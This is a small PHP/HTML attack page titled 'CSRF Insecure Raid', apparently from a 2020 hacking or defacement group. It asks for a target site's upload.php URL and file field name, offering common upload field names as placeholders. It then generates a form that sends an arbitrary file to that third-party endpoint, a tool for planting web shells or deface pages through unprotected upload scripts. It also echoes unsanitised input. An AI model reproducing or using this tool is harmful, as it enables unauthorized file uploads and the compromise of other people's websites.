<html>
<body bgcolor="black">
<style>
*{
	margin-top:0px;
}
body{
    background-position: center;
	background-color:#000000;
    height:150%;
    width:110%;
    background-attachment: fixed;
    background-size:150% 100%;
	background-image:url('  ');

}

</style>
<link href="" rel="stylesheet" type="text/css"> <meta property="og:image" content="http://i65.tinypic.com/52w48.jpg">
<title>Csrf Insecure Raid</title>
<center><font color="red">
<h1>CSRF INSECURE RAID</h1></center>
<center>
<img src="http://i63.tinypic.com/s681on.jpg" border="0"width="550px" height="200px">
</center>
<center><font color="red"><form method="post">
Domain: <input type="text" name="url" size="50" height="10" placeholder="http://www.target.com/[path]/upload.php" style="margin: 5px auto; padding-left: 5px;" required><br>
POST File: <input type="text" name="pf" size="50" height="10" placeholder="Filedata / files[] / qqfile / userfile / dll" style="margin: 5px auto; padding-left: 5px;" required><br>
<input type="submit" name="d" value="Kunci Domain">
</form>
<?php
$url = $_POST['url'];
$pf = $_POST['pf'];
$d = $_POST['d'];
if($d) {
	echo "<form method='post' target='_blank' action='$url' enctype='multipart/form-data'><input type='file' name='$pf'><input type='submit' name='g' value='Upload'></form";
}
?>
</form>
</font>
</center>
<center> <font color='red' face='Shrikhand' size='3'>Copyright &copy; 2020 <font color='pink'>Insecure Cyber Raid</font></center>
</html>